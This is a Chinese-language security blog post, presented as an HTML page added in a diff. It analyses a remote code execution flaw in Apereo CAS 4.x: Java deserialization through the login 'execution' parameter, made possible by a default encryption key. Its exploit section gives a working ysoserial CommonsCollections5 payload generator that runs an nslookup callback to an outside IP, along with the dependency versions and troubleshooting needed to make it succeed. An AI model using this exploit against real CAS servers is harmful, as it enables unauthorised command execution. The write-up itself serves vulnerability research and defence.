@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00 漏洞描述在Apereo Cas 4.X版本(测试了4.1.5、4.2.0)中的loginHandlerAdapter中存在反序列化漏洞，触发漏洞的是在登录中的execution参数，提交特定的数据即会触发命令执行 0x01 漏洞分析首先反序列化的执行点为：org.jasig.spring.webflow.plugin.EncryptedTranscoder#decode  public">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apereo Cas 反序列化漏洞">
+<meta property="og:url" content="http://example.com/2020/03/23/Apereo-Cas-Deserialization/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00 漏洞描述在Apereo Cas 4.X版本(测试了4.1.5、4.2.0)中的loginHandlerAdapter中存在反序列化漏洞，触发漏洞的是在登录中的execution参数，提交特定的数据即会触发命令执行 0x01 漏洞分析首先反序列化的执行点为：org.jasig.spring.webflow.plugin.EncryptedTranscoder#decode  public">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-03-22T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-03-17T10:08:41.589Z">
+<meta property="article:author" content="PENCH3R">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Apereo Cas 反序列化漏洞</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/category/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/03/19/EternalBlue-Vul/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/03/23/Apereo-Cas-Deserialization/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&text=Apereo Cas 反序列化漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&title=Apereo Cas 反序列化漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&is_video=false&description=Apereo Cas 反序列化漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Apereo Cas 反序列化漏洞&body=Check out this article: http://example.com/2020/03/23/Apereo-Cas-Deserialization/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&title=Apereo Cas 反序列化漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&title=Apereo Cas 反序列化漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&title=Apereo Cas 反序列化漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&title=Apereo Cas 反序列化漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&name=Apereo Cas 反序列化漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&t=Apereo Cas 反序列化漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">0x00 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">0x03 总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Apereo Cas 反序列化漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">PENCH3R</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-22T16:00:00.000Z" itemprop="datePublished">2020-03-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WebSecurity/">WebSecurity</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>在Apereo Cas 4.X版本(测试了4.1.5、4.2.0)中的loginHandlerAdapter中存在反序列化漏洞，触发漏洞的是在登录中的execution参数，提交特定的数据即会触发命令执行</p>
+<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>首先反序列化的执行点为：org.jasig.spring.webflow.plugin.EncryptedTranscoder#decode</p>
+ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">decode</span><span class="params">(<span class="type">byte</span>[] encoded)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">byte</span>[] data;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        data = <span class="built_in">this</span>.cipherBean.decrypt(encoded);	<span class="comment">// 解密数据</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Decryption error&quot;</span>, var11);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">inBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    Object var5;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.compression) &#123;</span><br><span class="line">            in = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(inBuffer));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            in = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inBuffer);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var5 = in.readObject();			<span class="comment">// 反序列化</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var10) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Deserialization error&quot;</span>, var10);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (in != <span class="literal">null</span>) &#123;</span><br><span class="line">            in.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> var5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过分析后梳理出大致的调用栈如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org.jasig.spring.webflow.plugin.EncryptedTranscoder#decode</span><br><span class="line">org.jasig.spring.webflow.plugin.ClientFlowExecutionRepository#getFlowExecution</span><br><span class="line">org.springframework.webflow.executor.FlowExecutorImpl#resumeExecution</span><br><span class="line">org.springframework.webflow.mvc.servlet.FlowHandlerAdapter#handle</span><br></pre></td></tr></table></figure>
+
+<p>而最外层的直接对应loginHandlerAdapter，cas-servlet.xml中对应配置：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;loginHandlerAdapter&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.jasig.cas.web.flow.SelectiveFlowHandlerAdapter&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">p:supportedFlowId</span>=<span class="string">&quot;login&quot;</span> <span class="attr">p:flowExecutor-ref</span>=<span class="string">&quot;loginFlowExecutor&quot;</span> <span class="attr">p:flowUrlHandler-ref</span>=<span class="string">&quot;loginFlowUrlHandler&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可控的数据在FlowHandlerAdapter.handle中接收，并传入到调用链中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public ModelAndView handle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;</span><br><span class="line">    FlowHandler flowHandler = (FlowHandler)handler;</span><br><span class="line">    this.checkAndPrepare(request, response, false);</span><br><span class="line">    String flowExecutionKey = this.flowUrlHandler.getFlowExecutionKey(request);		// 这里直接获取POST参数execution</span><br><span class="line">    if (flowExecutionKey != null) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            ServletExternalContext context = this.createServletExternalContext(request, response);</span><br><span class="line">            FlowExecutionResult result = this.flowExecutor.resumeExecution(flowExecutionKey, context);		// 触发链</span><br><span class="line">            this.handleFlowExecutionResult(result, context, request, response, flowHandler);</span><br><span class="line">        &#125; catch (FlowException var11) &#123;</span><br><span class="line">            this.handleFlowException(var11, request, response, flowHandler);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入的数据在反序列化之前，会先进行解密操作：org.jasig.spring.webflow.plugin.ClientFlowExecutionRepository#getFlowExecution</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClientFlowExecutionRepository.SerializedFlowExecutionState state = (ClientFlowExecutionRepository.SerializedFlowExecutionState)this.transcoder.decode(encoded);</span><br></pre></td></tr></table></figure>
+
+<p>后续跟入分析了decode的流程，默认并未使用随机key进行加解密，相关的调用栈如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org.cryptacular.bean.AbstractCipherBean#decrypt(byte[])</span><br><span class="line">org.cryptacular.CiphertextHeader#decode(byte[])</span><br><span class="line">org.cryptacular.bean.AbstractBlockCipherBean#process(org.cryptacular.CiphertextHeader, boolean, byte[])</span><br><span class="line">org.cryptacular.bean.BufferedBlockCipherBean#newCipher</span><br></pre></td></tr></table></figure>
+
+<p>这里在利用时，直接使用org.apereo.spring.webflow.plugin.EncryptedTranscoder进行数据的加密即可</p>
+<p>至此相关的关键点就比较清楚了：</p>
+<ul>
+<li>可控的数据如何传入</li>
+<li>可控数据的加解密</li>
+<li>反序列化的执行点</li>
+<li>完整的触发链</li>
+</ul>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>利用脚本：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.cryptacular.util.CodecUtil;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload;</span><br><span class="line"><span class="keyword">import</span> org.apereo.spring.webflow.plugin.EncryptedTranscoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApereoExploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String poc[] = &#123;<span class="string">&quot;CommonsCollections5&quot;</span>,<span class="string">&quot;nslookup pench3r.github.io 159.65.72.169&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">payloadObject</span> <span class="operator">=</span> ObjectPayload.Utils.makePayloadObject(poc[<span class="number">0</span>], poc[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">//AES加密</span></span><br><span class="line">        <span class="type">EncryptedTranscoder</span> <span class="variable">et</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EncryptedTranscoder</span>();</span><br><span class="line">        <span class="type">byte</span>[] encode = et.encode(payloadObject);</span><br><span class="line">        <span class="comment">// Object decode = et.decode(encode);</span></span><br><span class="line">        <span class="comment">//base64编码</span></span><br><span class="line">        System.out.println(CodecUtil.b64(encode));</span><br><span class="line">        <span class="type">byte</span>[] decode = CodecUtil.b64(CodecUtil.b64(encode));</span><br><span class="line">        System.out.println(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本地环境搭建时需要注意一些包的版本信息：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.cryptacular<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cryptacular<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apereo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webflow-client-repo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>		// 为了本地调试</span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>本地测试的思路：</strong></p>
+<ul>
+<li>添加commons collections3.1版本，可以提供反序列化攻击链</li>
+<li>使用EncryptedTranscoder的encode和decode可以直接测试是否可以成功执行命令</li>
+<li>最后在测试环境中动态调试比对那些地方需要调整</li>
+</ul>
+<p><strong>碰到的一些问题：</strong></p>
+<ul>
+<li><p>在jdk8的环境下，使用CommonsCollections1时，提示：<code>java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet</code>;</p>
+<p>解决办法：使用CommonsCollections5即可</p>
+</li>
+<li><p>在测试环境一直失败，通过调试发现，在EncryptedTranscoder.decode时所接受的data与payload生成的data数据不一致，原因是payload和环境中使用的org.cryptacular版本不一致导致</p>
+<p>解决办法：payload切换org.cryptacular版本为1.0即可</p>
+</li>
+<li><p>在测试环境中跟踪反序列化过程，检测到<code>ClassNotFoundException: org.apache.commons.collections.keyvalue.TiedMapEntry</code></p>
+<p>解决办法：将commons-collections3.1.jar加入到测试环境中的CLASSPATH中即可</p>
+</li>
+</ul>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>该漏洞的形式跟shiro反序列化的类似，同样是因为反序列化的数据过度依赖自身的加密算法进行解密，算法本身没有问题，问题是算法使用的key都是默认值导致攻击者可以去构造对应的数据</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/category/">Category</a></li>
+         
+          <li><a href="/tag/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">0x00 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">0x03 总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/03/23/Apereo-Cas-Deserialization/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&text=Apereo Cas 反序列化漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&title=Apereo Cas 反序列化漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&is_video=false&description=Apereo Cas 反序列化漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Apereo Cas 反序列化漏洞&body=Check out this article: http://example.com/2020/03/23/Apereo-Cas-Deserialization/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&title=Apereo Cas 反序列化漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&title=Apereo Cas 反序列化漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&title=Apereo Cas 反序列化漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&title=Apereo Cas 反序列化漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&name=Apereo Cas 反序列化漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/03/23/Apereo-Cas-Deserialization/&t=Apereo Cas 反序列化漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2022
+    PENCH3R
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/category/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js" crossorigin="anonymous"></script>
+  
+<script src="/js/wrapImage.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
